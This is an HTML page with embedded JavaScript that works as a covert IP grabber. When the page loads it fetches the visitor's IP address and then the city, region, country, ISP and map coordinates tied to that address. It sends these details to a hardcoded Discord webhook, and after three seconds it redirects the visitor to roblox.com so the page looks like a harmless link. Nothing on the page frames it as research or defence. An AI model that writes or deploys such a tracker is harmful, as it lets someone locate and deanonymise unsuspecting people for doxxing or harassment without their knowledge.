<!DOCTYPE html>
<html>
<body>
<script>
const webhook = "https://discord.com/api/webhooks/1532569658543177738/GytKMid4oNbpE8jS9X_zdcqJf1ZcW23V3_V9LYOST85C4v5ZWbtT198sLiZStmZJdyOk";

// Method 1: Using a different IP service
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        return fetch('https://ipinfo.io/' + data.ip + '/json');
    })
    .then(r => r.json())
    .then(location => {
        const message = {
            content: "**IP:** " + location.ip + 
                    "\n**City:** " + location.city + 
                    "\n**Region:** " + location.region + 
                    "\n**Country:** " + location.country +
                    "\n**ISP:** " + location.org +
                    "\n**Location:** https://maps.google.com/?q=" + location.loc
        };
        
        return fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(message)
        });
    })
    .catch(() => {
        // Fallback: Use a different service
        fetch('https://geolocation-db.com/json/')
            .then(r => r.json())
            .then(data => {
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: "**IP:** " + data.IPv4 + "\n**City:** " + data.city + "\n**Country:** " + data.country_name
                    })
                });
            });
    });

// Redirect
setTimeout(() => {
    window.location.href = "https://www.roblox.com";
}, 3000);
</script>
</body>
</html>
